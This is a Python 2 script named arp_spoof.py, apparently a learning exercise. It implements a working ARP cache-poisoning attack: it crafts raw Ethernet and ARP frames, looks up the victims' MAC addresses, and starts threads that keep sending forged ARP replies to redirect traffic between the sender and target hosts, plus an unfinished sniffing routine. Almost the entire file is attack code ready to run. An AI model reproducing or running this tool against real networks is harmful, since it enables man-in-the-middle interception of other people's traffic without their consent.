#!/usr/bin/python
#-*- coding: utf-8 -*-

import subprocess
import sys
import re
import struct
from threading import *
from time import sleep
from pwn import hexdump
from socket import *

execmd = lambda cmd : subprocess.check_output(cmd, shell=True)
trans_ip = lambda addr : ''.join(map(lambda x:chr(eval(x)), addr.split('.')))
trans_mac = lambda mac : ''.join(map(lambda x:x.decode('hex'), mac.split(':')))
reverse_ip = lambda addr : '.'.join(map(lambda x : str(ord(x)), [x for x in addr]))
reverse_mac = lambda mac : ':'.join(map(lambda x : x.encode('hex'), [x for x in mac]))

p16 = lambda x : struct.pack('>H', x)
p32 = lambda x : struct.pack('>I', x)
u16 = lambda x : struct.unpack('>H', x)[0]
u32 = lambda x : struct.unpack('>I', x)[0]

ip_regex = ('[\d]{1,3}.'*4)[:-1]
mac_regex = ('[0-9a-f]{2}:'*6)[:-1]

'''
Send packet
'''
def sendeth(dst, src, type, payload):
    pkt = trans_mac(src)
    pkt += trans_mac(dst)
    pkt += p16(type)
    pkt += payload
    s = socket(AF_PACKET, SOCK_RAW)
    s.bind((sys.argv[1], 0))
    s.send(pkt)
    
'''
Make arp packet
'''
def make_arp(hwtype, ptype, hwlen, plen, oper, snd_mac, snd_ip, tar_mac, tar_ip):
    pkt = ''
    pkt += p16(hwtype)
    pkt += p16(ptype)
    pkt += chr(hwlen)
    pkt += chr(plen)
    if oper == 'req':
        pkt += p16(0x1)
    elif oper == 'reply':
        pkt += p16(0x2)
    pkt += trans_mac(snd_mac)
    pkt += trans_ip(snd_ip)
    pkt += trans_mac(tar_mac)
    pkt += trans_ip(tar_ip)
    return pkt

'''
Receive packet
'''
def sniff_pkt(idx):
    s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
    idx = 0
    while True:
        packet = s.recvfrom(65535)
        eth_header = struct.unpack("!6s6s2s", packet[0][0:14])
        if eth_header[2] == '\x08\x06':
            arp_header = struct.unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
             

'''
Get my mac,ip address 
'''
def getMyAddr(dev):
    tmp = execmd('ifconfig | grep {} -A 10'.format(dev))
    my_ip = re.findall(ip_regex, tmp)[0]
    my_mac = re.findall(mac_regex, tmp)[0]
    return my_mac, my_ip

'''
Get mac address using ip address.
'''
def get_macaddr(ip_addr):
    eth_dstmac = 'ff:ff:ff:ff:ff:ff'
    eth_srcmac = my_mac
    arp_sndmac = my_mac       
    arp_sndip = my_ip
    arp_tarmac = '00:00:00:00:00:00'
    arp_tarip = ip_addr
    pay = make_arp(0x1, 0x0800, 0x6, 0x4, 'req', arp_sndmac, arp_sndip, arp_tarmac, arp_tarip)
    sendeth(eth_srcmac, eth_dstmac, 0x0806, pay)

    s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
    while True:
        packet = s.recvfrom(65535)
        eth_header = struct.unpack("!6s6s2s", packet[0][0:14])
        if eth_header[2] == '\x08\x06': #ETH_TYPE == ARP
            arp_header = struct.unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
            if u16(arp_header[4]) == 2: #ARP_OPCODE == REPLY
                if arp_header[6] == trans_ip(ip_addr):
                    return reverse_mac(arp_header[5])

'''
Send arp reply packet to sender.
'''
def ARP_reply(idx):
    while True:
        try:
            eth_dstmac = sender_mac[idx]
            eth_srcmac = my_mac
            pay = make_arp(0x1, 0x0800, 0x6, 0x4, 'reply', my_mac, target_ip[idx], sender_mac[idx], sender_ip[idx])
            sendeth(eth_srcmac, eth_dstmac, 0x0806, pay)
            print '[*] ARP reply packet send to {}'.format(sender_ip)
            sleep(1)
        except:
            break


if __name__ == '__main__':
    print '[+] Check args.'
    if (len(sys.argv) < 4) or (len(sys.argv) % 2):
        print '[!] Usage : python arp_spoof.py <interface> <sender ip1> <target ip1> [<sender ip2> <target ip2> ...]'
        exit()

    print '[+] Init.' 
    my_ip = ''        
    my_mac = ''       
    sender_ip = []        
    sender_mac = []       
    target_mac = []       
    target_ip = []       

    print '[+] Get my Address.'
    ifname = sys.argv[1]
    for idx in range(1, (len(sys.argv)-2)/2 + 1):
        sender_ip.append(sys.argv[2*idx])
        target_ip.append(sys.argv[2*idx+1])
    my_mac, my_ip = getMyAddr(ifname)

    print '[+] Get sender, target mac address.'
    for idx in range((len(sys.argv)-2)/2):
        sender_mac.append(get_macaddr(sender_ip[idx]))
        target_mac.append(get_macaddr(target_ip[idx]))

    print '[*]', 'INFORMATION'.center(30, '-')
    print 'MY IP'.ljust(14, ' '),': {}'.format(my_ip)
    print 'MY MAC'.ljust(14, ' '), ': {}'.format(my_mac)
    for idx in range((len(sys.argv)-2)/2):
        print '-'*34
        print 'SENDER{} IP'.format(idx+1).ljust(14, ' '), ': {}'.format(sender_ip[idx])
        print 'SENDER{} MAC'.format(idx+1).ljust(14, ' '), ': {}'.format(sender_mac[idx])
        print 'TARGET{} IP'.format(idx+1).ljust(14, ' '), ': {}'.format(target_ip[idx])
        print 'TRAGET{} MAC'.format(idx+1).ljust(14, ' '), ': {}'.format(target_mac[idx])
    print '-'*34

    for idx in range((len(sys.argv)-2)/2):
        print '[*] TARGET{} ARP_SPOOF THREAD START!'.format(idx+1)
        Thread(target=ARP_reply, args=(idx,)).start() 

    for idx in range((len(sys.argv)-2)/2):
        print '[*] TARGET{} SNIFFING THREAD START!'.format(idx+1)
        Thread(target=sniff_pkt, args=(idx,)).start() 

    while(1):
        try:
            sleep(5)
        except:
            break
